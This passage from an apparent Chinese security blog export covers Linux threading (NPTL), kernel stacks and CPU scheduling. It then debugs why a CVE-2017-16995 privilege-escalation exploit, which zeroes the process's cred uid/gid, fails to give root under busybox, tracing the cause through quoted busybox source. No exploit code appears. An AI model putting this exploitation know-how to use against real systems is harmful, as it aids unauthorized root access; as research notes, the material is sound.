create_thread，这个函数最终在Linux的内核里还是去调用了创建“进程”的函数去创建了一个进程（因为OS没变嘛，没有线程这个东西）。 如果有人要多线程编程，那么你就调用 这个create_thread 去创建线程吧，好了，这个线程，就是用库函数创建的线程，就是所谓的“用户级线程”了。等等，这是神马意思？赤裸裸的欺骗？也不是。为什么不是？因为别人给你提供了这个线程函数，你创建了“线程”，那么，你的线程（虽然本质上还是进程）就有了“线程”的一些“特征”，比如可以共享变量啊什么的，咦？那怎么做到的？当然有一套机制，反正人家给你做好了，你用就行了。这种欺骗自然是不“完美”的，有线程的“一些”特征，但不能完全符合理论上的“线程”的概念(POSIX的要求），比如，这种多线程不能被分配到多核上，用户创建的N个线程，对于着内核里面其实就一个“进程”，导致调度啊，管理啊麻烦.....为什么要采用这种“模拟”的方式呢？改内核不是一天两天的事情，先将就用着吧。内核慢慢来改。怎么干改内核这个艰苦卓越的工作？Linux是开源、免费的，谁愿意来干这个活？有两家公司参与了对LinuxThreads的改进（向他们致敬）：IBM启动的NGTP(Next Generation POSIX Threads)项目，以及红帽Redhat公司的NPTL（Native POSIX Thread Library），IBM那个项目，在2003年因为种种原因放弃了，大家都转到NPTL这个项目来了。最终，当然是成功了，在Linux 2.6的内核版本中，这个NPTL项目怎么做的呢？并不是在Linux内核中加了一个“线程”，仍然和原来一样，进程（其实，进程线程就是个概念，对于计算机，只要能高效的实现这个概念就行，程序员能用就OK，管它究竟怎么实现的），不过，用的clone实现的轻量级进程，内核又增加了若干机制来保证线程的表现和POSIX相同，最关键的一点，用户调用pthread库创建的一个线程，会在内核创建一个“线程”，这就是所谓的1：1模型。所以，Linux下，是有“内核级”线程的，网上很多说Linux是用户级线程，都是不完整的，说的Linux很早以前的版本（现在Linux已经是4.X的版本了）。还有个 pthread 的问题，pthread是个线程函数库，他提供了一些函数，让程序员可以用它来创建，使用线程。那么问题是，这个函数库里面的函数，比如 pthread_create 创建线程的函数，他是怎么实现的呢？他如果是用以前的方法，那程序员用它来创建的线程，还是“用户级”线程；如果它使用了NPTL方式创建线程，那么，它创建的线程，就是“内核级”线程。OK，结论，如果你  1：使用2.6的内核的系统平台，2：你的gcc支持NPTL （现在一般都支持），那么你编译出来的多线程程序，就是“内核级”线程了。所以，现在回答问题，只要你不是很古董级的电脑，Linux下用pthread创建的线程是“内核级线程”最后，这NPTL也并不是完美的，还有一些小问题，像有一些商业操作系统，可以实现混合模型，如1:1，N:M等（就是内核线程和用户线程的对应关系），这就强大了，Linux仍有改进的空间</span><br></pre></td></tr></table></figure><h2 id="中断栈？内核栈？"><a href="#中断栈？内核栈？" class="headerlink" title="中断栈？内核栈？"></a>中断栈？内核栈？</h2><p>在intel80x86架构的系统上，如果<code>thread_union</code>的大小为4kb，那么就存在三种不同的栈：异常栈，硬中断栈，软中断栈，这三个栈与每一个cpu核心一一对应。</p><p>如果<code>thread_union</code>的大小为8kb，那么这三种栈将会共享当前线程的内核栈</p><p>在当前的linux平台上，绝大部分情况下都默认共享当前线程的内核栈</p><h2 id="死循环为何能占用cpu达100-？"><a href="#死循环为何能占用cpu达100-？" class="headerlink" title="死循环为何能占用cpu达100%？"></a>死循环为何能占用cpu达100%？</h2><p>乍看之下，这个问题还是挺蠢的，死循环嘛，自然应当占用100%</p><p>但了解其背后的原理，我想也是必要的</p><p>实际上，cpu从加电的那一瞬间，cpu就从未停歇，哪怕在某个瞬间没有任何的任务在执行，cpu也会执行一个死循环cpu_idle，不断调用schedule函数，所以，cpu实际上一直是满载的</p><p>那么为什么cpu占用率却不是一直100%呢？这主要是由于占用率的计算方式与我们理解的不同，其代表的是在就绪队列中有线程被调度使用cpu后，此线程占用cpu运行时间的百分比，也就是说，当没有一个线程处于RUNNING状态下，cpu的占用率就应当是0</p><p>另外，我们还需要了解时钟中断，设想我们启动了一个死循环的线程，此时如果没有时钟中断，那么cpu将永远无法停止执行此死循环的线程，这是我们所不希望看到的，所以，在现代的计算机中，都存在时钟中断，时钟频率大约是100次/s，每一次的中断都会强制使得内核夺回cpu的控制权，检查当前正在运行的线程占据时间片的情况，依据算法决定是否将此线程的<code>TIF_NEED_RESCHED</code>位置位，并在中断退出时检查<code>TIF_NEED_RESCHED</code>位，当此位被置位，则执行schedule，调度下一个等待的线程执行，防止一个线程长时间占用cpu</p><p>明白了以上的知识，应该就能理解死循环为何占用100%了。</p><p>总结一下，当你启动一个死循环的线程，你会看到其cpu占用率快速增长至100%，并进行一定范围内的浮动，实际上这个浮动就是由于时钟中断引起的，死循环实际上并没有完全占据cpu，而是在一些时间内被调度出去，从而让cpu执行其他任务，但是为什么死循环虽然受到时钟中断的影响，却仍然可以保持接近100%的cpu的占用率呢？这是由于我们写的诸如<code>while()&#123;&#125;;</code>这类的死循环，永远不会挂起，换句话说，当死循环被时钟中断调度出去之后，其状态仍是RUNNING(此时RUNNING代表的是就绪状态)，其又会被插入到就绪队列中，也就是说，当被调入的其他线程执行完成后，下一个被调度的大概率还是死循环，如此周而复始，由于系统中绝大多数线程都不可能时时刻刻保持RUNNING状态，而死循环却能一直保持RUNNING状态，所以在我们的视角看来，死循环占用cpu的时间将会接近100%，其会不断的被调度给cpu执行，永不停歇。</p><p>另外，时钟中断也是说明了为何我们跑一个死循环却不会导致控制台或者其他系统必要线程完全卡死，不能得到执行的原因，但是虽然有时钟中断的存在，当我们执行了太多的死循环后，控制台或者其他系统必要线程仍然可能出现无法响应，或者响应极其缓慢的情况，这是由于此时就绪队列里存在了大量的无意义的死循环线程，这样就导致真正需要被执行的控制台线程或者其他系统必要线程获得cpu时间片的概率大大降低，反应到用户层面就是响应迟缓，甚至无法响应(可以实际试试，你会发现当你执行几个死循环时，对系统运行没有太大的影响，但当你执行了十几个甚至几十个死循环后，系统响应极其缓慢，而且这些死循环cpu占用率均不是100%，而是近似100%*核数/死循环数)</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux内核中的xID</title>
      <link href="linux-xid.html"/>
      <url>linux-xid.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实这篇算是临时想写的～顺便记一记坑防止以后自己再踩进去</p><h1 id="提权不成功？"><a href="#提权不成功？" class="headerlink" title="提权不成功？"></a>提权不成功？</h1><p>这个坑主要是我在用了CVE-2017-16995原始的exp时，发现提权不成功才踩到的</p><p>在原始的exp中，作者将<code>task_struct-&gt;cred-&gt;uid&amp;&amp;gid</code>置0，于是在fork后的<code>/bin/sh</code>中，获得了root权限</p><p>这个乍一想没啥毛病，我那时候也是觉得没啥问题</p><p>但是，我在调试的时候，发现并不成功，仅仅修改<code>uid&amp;&amp;gid</code>且fork后的<code>/bin/sh</code>并没有获得root权限，而是如下情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; $ id</span><br><span class="line">uid&#x3D;0 gid&#x3D;0 euid&#x3D;1001(test1) egid&#x3D;1001 groups&#x3D;1001</span><br></pre></td></tr></table></figure><p>我们知道，<code>euid&amp;&amp;egid</code>才是实际标示当前进程权限的值，也就是说，这个fork后的<code>/bin/sh</code>虽然<code>uid&amp;&amp;gid</code>为0，但不知为何，<code>euid&amp;&amp;egid</code>却没有同样被置零</p><p>我找了真机测试了一下，同样是仅修改<code>uid&amp;&amp;gid</code>为0，但在bash上却不会出现这种情况，fork后的<code>/bin/bash</code>进程的<code>euid&amp;&amp;egid</code>被bash置为了与<code>uid&amp;&amp;gid</code>一样的值：0</p><p>疑惑.jpg</p><p>思索了一阵子，我觉得是不是busybox有什么问题(说明一下，我是用busybox+linux kernel调试)</p><p>故而，我去找了下busybox的源码，一探究竟</p><h1 id="真有你的-busybox"><a href="#真有你的-busybox" class="headerlink" title="真有你的,busybox"></a>真有你的,busybox</h1><p>来看看busybox对于<code>sh</code>的实现(busybox version == 1.26.2)</p><p> 先来看<code>busybox_main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">busybox_main</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!argv[<span class="number">1</span>]) &#123;</span><br><span class="line"><span class="comment">/* Called without arguments */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *a;</span><br><span class="line"><span class="keyword">int</span> col;</span><br><span class="line"><span class="keyword">unsigned</span> output_width;</span><br><span class="line"> help:</span><br><span class="line">output_width = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">if</span> (ENABLE_FEATURE_AUTOWIDTH) &#123;</span><br><span class="line"><span class="comment">/* Obtain the terminal width */</span></span><br><span class="line">output_width = get_terminal_width(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">full_write2_str(bb_banner); <span class="comment">/* reuse const string */</span></span><br><span class="line">full_write2_str(<span class="string">&quot; multi-call binary.\n&quot;</span>); <span class="comment">/* reuse */</span></span><br><span class="line">full_write2_str(</span><br><span class="line"><span class="string">&quot;BusyBox is copyrighted by many authors between 1998-2015.\n&quot;</span></span><br><span class="line"><span class="string">&quot;Licensed under GPLv2. See source distribution for detailed\n&quot;</span></span><br><span class="line"><span class="string">&quot;copyright notices.\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Usage: busybox [function [arguments]...]\n&quot;</span></span><br><span class="line"><span class="string">&quot;   or: busybox --list&quot;</span>IF_FEATURE_INSTALLER(<span class="string">&quot;[-full]&quot;</span>)<span class="string">&quot;\n&quot;</span></span><br><span class="line">IF_FEATURE_INSTALLER(</span><br><span class="line"><span class="string">&quot;   or: busybox --install [-s] [DIR]\n&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;   or: function [arguments]...\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line">IF_NOT_FEATURE_SH_STANDALONE(</span><br><span class="line"><span class="string">&quot;\tBusyBox is a multi-call binary that combines many common Unix\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tutilities into a single executable.  Most people will create a\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tlink to busybox for each function they wish to use and BusyBox\n&quot;</span></span><br><span class="line"><span class="string">&quot;\twill act like whatever it was invoked as.\n&quot;</span></span><br><span class="line">)</span><br><span class="line">IF_FEATURE_SH_STANDALONE(</span><br><span class="line"><span class="string">&quot;\tBusyBox is a multi-call binary that combines many common Unix\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tutilities into a single executable.  The shell in this build\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tis configured to run built-in utilities without $PATH search.\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tYou don&#x27;t need to install a link to busybox for each utility.\n&quot;</span></span><br><span class="line"><span class="string">&quot;\tTo run external program, use full path (/sbin/ip instead of ip).\n&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Currently defined functions:\n&quot;</span></span><br><span class="line">);</span><br><span class="line">col = <span class="number">0</span>;</span><br><span class="line">a = applet_names;</span><br><span class="line"><span class="comment">/* prevent last comma to be in the very last pos */</span></span><br><span class="line">output_width--;</span><br><span class="line"><span class="keyword">while</span> (*a) &#123;</span><br><span class="line"><span class="keyword">int</span> len2 = <span class="built_in">strlen</span>(a) + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (col &gt;= (<span class="keyword">int</span>)output_width - len2) &#123;</span><br><span class="line">full_write2_str(<span class="string">&quot;,\n&quot;</span>);</span><br><span class="line">col = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (col == <span class="number">0</span>) &#123;</span><br><span class="line">col = <span class="number">6</span>;</span><br><span class="line">full_write2_str(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">full_write2_str(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">full_write2_str(a);</span><br><span class="line">col += len2;</span><br><span class="line">a += len2 - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">full_write2_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_prefixed_with(argv[<span class="number">1</span>], <span class="string">&quot;--list&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *a = applet_names;</span><br><span class="line">dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span> (*a) &#123;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> ENABLE_FEATURE_INSTALLER</span></span><br><span class="line"><span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">6</span>]) <span class="comment">/* --list-full? */</span></span><br><span class="line">full_write2_str(install_dir[APPLET_INSTALL_LOC(i)] + <span class="number">1</span>);</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">full_write2_str(a);</span><br><span class="line">full_write2_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">while</span> (*a++ != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ENABLE_FEATURE_INSTALLER &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--install&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> use_symbolic_links;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *busybox;</span><br><span class="line"></span><br><span class="line">busybox = xmalloc_readlink(bb_busybox_exec_path);</span><br><span class="line"><span class="keyword">if</span> (!busybox) &#123;</span><br><span class="line"><span class="comment">/* bb_busybox_exec_path is usually &quot;/proc/self/exe&quot;.</span></span><br><span class="line"><span class="comment"> * In chroot, readlink(&quot;/proc/self/exe&quot;) usually fails.</span></span><br><span class="line"><span class="comment"> * In such case, better use argv[0] as symlink target</span></span><br><span class="line"><span class="comment"> * if it is a full path name.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (argv[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">bb_error_msg_and_die(<span class="string">&quot;&#x27;%s&#x27; is not an absolute path&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">busybox = argv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* busybox --install [-s] [DIR]:</span></span><br><span class="line"><span class="comment"> * -s: make symlinks</span></span><br><span class="line"><span class="comment"> * DIR: directory to install links to</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">use_symbolic_links = (argv[<span class="number">2</span>] &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">2</span>], <span class="string">&quot;-s&quot;</span>) == <span class="number">0</span> &amp;&amp; ++argv);</span><br><span class="line">install_links(busybox, use_symbolic_links, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* &quot;busybox --help [&lt;applet&gt;]&quot; */</span></span><br><span class="line"><span class="keyword">if</span> (!argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">goto</span> help;</span><br><span class="line"><span class="comment">/* convert to &quot;&lt;applet&gt; --help&quot; */</span></span><br><span class="line">argv[<span class="number">0</span>] = argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* &quot;busybox &lt;applet&gt; arg1 arg2 ...&quot; */</span></span><br><span class="line">argv++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We support &quot;busybox /a/path/to/applet args...&quot; too. Allows for</span></span><br><span class="line"><span class="comment"> * &quot;#!/bin/busybox&quot;-style wrappers */</span></span><br><span class="line">applet_name = bb_get_last_path_component_nostrip(argv[<span class="number">0</span>]);</span><br><span class="line">run_applet_and_exit(applet_name, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的一堆，直到<code>run_applet_and_exit</code>函数，都不需要关注，仅做一些判断，我们主要关注最后将要进到的<code>run_applet_and_exit</code>函数</p><p>看看<code>run_applet_and_exit</code>这个函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> NORETURN <span class="keyword">void</span> <span class="title">run_applet_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> ENABLE_BUSYBOX</span></span><br><span class="line"><span class="keyword">if</span> (is_prefixed_with(name, <span class="string">&quot;busybox&quot;</span>))</span><br><span class="line"><span class="built_in">exit</span>(busybox_main(argv));</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> NUM_APPLETS &gt; 0</span></span><br><span class="line"><span class="comment">/* find_applet_by_name() search is more expensive, so goes second */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> applet = find_applet_by_name(name); <span class="comment">// 根据第一个参数值找到对应的applet</span></span><br><span class="line"><span class="keyword">if</span> (applet &gt;= <span class="number">0</span>)</span><br><span class="line">run_applet_no_and_exit(applet, argv); <span class="comment">// 进入这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*bb_error_msg_and_die(&quot;applet not found&quot;); - links in printf */</span></span><br><span class="line">full_write2_str(applet_name);</span><br><span class="line">full_write2_str(<span class="string">&quot;: applet not found\n&quot;</span>);</span><br><span class="line"><span class="comment">/* POSIX: &quot;If a command is not found, the exit status shall be 127&quot; */</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">127</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看<code>run_applet_no_and_exit</code>的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> FAST_FUNC <span class="title">run_applet_no_and_exit</span><span class="params">(<span class="keyword">int</span> applet_no, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> argc = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (argv[argc])</span><br><span class="line">argc++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reinit some shared global data */</span></span><br><span class="line">xfunc_error_retval = EXIT_FAILURE;</span><br><span class="line">applet_name = bb_get_last_path_component_nostrip(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Special case. POSIX says &quot;test --help&quot;</span></span><br><span class="line"><span class="comment"> * should be no different from e.g. &quot;test --foo&quot;.</span></span><br><span class="line"><span class="comment"> * Thus for &quot;test&quot;, we skip --help check.</span></span><br><span class="line"><span class="comment"> * &quot;true&quot; and &quot;false&quot; are also special.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined APPLET_NO_test</span></span><br><span class="line"> &amp;&amp; applet_no != APPLET_NO_test</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined APPLET_NO_true</span></span><br><span class="line"> &amp;&amp; applet_no != APPLET_NO_true</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined APPLET_NO_false</span></span><br><span class="line"> &amp;&amp; applet_no != APPLET_NO_false</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">2</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Make &quot;foo --help&quot; exit with 0: */</span></span><br><span class="line">xfunc_error_retval = <span class="number">0</span>;</span><br><span class="line">bb_show_usage();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ENABLE_FEATURE_SUID) <span class="comment">// 默认开启</span></span><br><span class="line">check_suid(applet_no); <span class="comment">// 关键</span></span><br><span class="line">xfunc_error_retval = applet_main[applet_no](argc, argv); <span class="comment">// 启动对应的applet，我们这里对应的是ash_main</span></span><br><span class="line"><span class="comment">/* Note: applet_main() may also not return (die on a xfunc or such) */</span></span><br><span class="line">xfunc_die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，在执行对应的applet之前，busybox执行了<code>check_suid</code>函数</p><p>来看看这个函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_suid</span><span class="params">(<span class="keyword">int</span> applet_no)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">gid_t</span> rgid;  <span class="comment">/* real gid */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ruid == <span class="number">0</span>) <span class="comment">/* set by parse_config_file() */</span></span><br><span class="line"><span class="keyword">return</span>; <span class="comment">/* run by root - no need to check more */</span> <span class="comment">// 斜眼笑.jpg</span></span><br><span class="line">rgid = getgid();</span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> ENABLE_FEATURE_SUID_CONFIG</span></span><br><span class="line"><span class="keyword">if</span> (suid_cfg_readable) &#123;</span><br><span class="line"><span class="keyword">uid_t</span> uid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">suid_config_t</span> *<span class="title">sct</span>;</span></span><br><span class="line"><span class="keyword">mode_t</span> m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (sct = suid_config; sct; sct = sct-&gt;m_next) &#123;</span><br><span class="line"><span class="keyword">if</span> (sct-&gt;m_applet == applet_no)</span><br><span class="line"><span class="keyword">goto</span> found;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> check_need_suid;</span><br><span class="line"> found:</span><br><span class="line"><span class="comment">/* Is this user allowed to run this applet? */</span></span><br><span class="line">m = sct-&gt;m_mode;</span><br><span class="line"><span class="keyword">if</span> (sct-&gt;m_ugid.uid == ruid)</span><br><span class="line"><span class="comment">/* same uid */</span></span><br><span class="line">m &gt;&gt;= <span 